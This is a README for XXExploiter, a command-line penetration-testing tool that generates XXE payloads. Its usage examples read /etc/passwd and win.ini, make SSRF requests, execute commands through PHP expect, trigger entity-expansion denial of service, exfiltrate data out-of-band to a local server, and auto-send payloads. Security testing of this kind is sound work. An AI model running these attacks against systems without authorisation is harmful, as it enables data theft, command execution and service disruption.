# XXExploiter  
  
![Build](https://github.com/luisfontes19/xxexploiter/workflows/Build/badge.svg)
[![codecov](https://codecov.io/gh/luisfontes19/xxexploiter/branch/master/graph/badge.svg)](https://codecov.io/gh/luisfontes19/xxexploiter)
[![Known Vulnerabilities](https://snyk.io/test/github/luisfontes19/xxexploiter/badge.svg?targetFile=package.json)](https://snyk.io/test/github/luisfontes19/xxexploiter?targetFile=package.json)

![XXExploiter](banner.png?raw=true)

I wrote this tool to help me testing XXE vulnerabilities.   
It generates the XML payloads, and automatically starts a server to serve the needed DTD's or to do data exfiltration.   
  
**IMPORTANT: This tool is still under development and although most of its features are already working, some may have not been tested properly.**  
  
## Installation  
  
```
#install node and npm if you don't have it yet 
npm install -g xxexploiter-ts
```
  
## Building & Running  from source
This is a simple Node application written with typescript. So you can build it as you build other apps:  
(install node and npm first, if you dont have them)  
```  
npm install  
npm run build  
#you may need to npm install tsc -g in order for 'npm build' to success  
```  
  
To run the app you can do it with one of two ways:  
  
```  
npm start [args]  
node dist/index.js [args]  
```  
  
  
## Usage  
  
```  
Usage: xxexploiter [command] [options]  
  
Commands:  
  xxexploiter file [file_to_read]  Use XXE to read a file  
  xxexploiter request [URL]        Use XXE to do a request  
  xxexploiter expect [command]     Use XXE to execute a command through PHP's  
                                expect  
  xxexploiter xee [expantions]     Generate a huge content by resolving entities  
  
Options:  
  --version       Show version number                                    
  -s, --server    Server address for OOB and DTD  
  -p, --port      Server port for OOB. Default: 7777  
  -t, --template  path to an XML template where to inject payload  
  -m, --mode      Extraction Mode: xml, oob, cdata. Default: xml  
  -e, --encode    Extraction Encoding: none, phpbase64. Default: none  
  -o, --output    Output for the XML payload file. Default is to console  
  -x              Use a request to automatically send the xml file  
  -h, --help      Show help                                              
  
Examples:  
  xxexploiter expect ls  
  xxexploiter -s 127.0.0.1 expect ls -e phpbase64 -m oob -o output.xml  
  xxexploiter -s 127.0.0.1 file /c/windows/win.ini -t xmltemplate.xml -m oob  
  xxexploiter xee 900000000 -o output.xml  
  xxexploiter file /etc/passwd -x request.txt -t template.xml  
  
Extra Info:  
  - When using the xml or cdata modes, add the placeholder '{{XXE}}' in the  
  field where you want the entity content to be injected  
  - When specifiying file paths for windows the format should be as:  
  /c:/windows/win.ini (Notice the first slash).  
  - OOB: Out Of Bound: You can use this option to send the data processed by the  
  xml parser, to your local webserver. Usefull with blind attacks  
  - When using XML mode, it may break the XML parsing if XML reserved characters  
  are loaded  
  - When using the request option, you can specify the placeholder to inject the  
  payload with {{XXE}} or {{XXE_B64}}  
```  
  
There are basically 4 main commands:  
* **file** - to read local files  
* **request** - do SSRF attack, to make requests from the target machine  
* **expect** - Use PHP expect to execute commands, if your target is a PHP app  
* **XEE** - Just do parameter expansions to try to cause a DOS.  
   
## Some notes:  
  
If you choose to use OOB or CDATA mode, XXExploiter will generate the necessary dtd to be included, and will start a server to host them. Have in mind that if you use these options you should set the server address  
  
If you include content in the body of the XML have in mind that XML restricted characters like '<' may break the parsing so be sure to use CDATA or PHP's base64encode  
  
Most of languages limit the number of entity expantions, or the total length of the content expanded, so make sure you test XEE on your machine first, with the same conditions as the target  
  
## Template  
Sometimes we need to send XML with specific fields to be able to exploit a vulnerability. So in order to help, I've introduced the -t (--template) option.   

You can create a regular XML file to be used to generate the malicious payload.  
If you want to add the content of a request or a file read in the content of this file, you can place the placeholder {{XXE}} where you want that to be.  

There may be some limitations right now with this option, if you send an XML template with a DOCTYPE field.  
  
## Request  
  
After all this automation it would be boring to have to manually send the XML file to the server right?  
Yeah, so I created a really nice option (-x) to automatically do it for you.  

You can use a request that you grab for example from Burp, and use it here. (Note that the -x options wants a file)  

In the place where you want the XML content to be injected you can add the placeholder {{XXE}} or if you need it encoded in b64 (yeah, i needed it once) use {{XXE_B64}}  
  
  
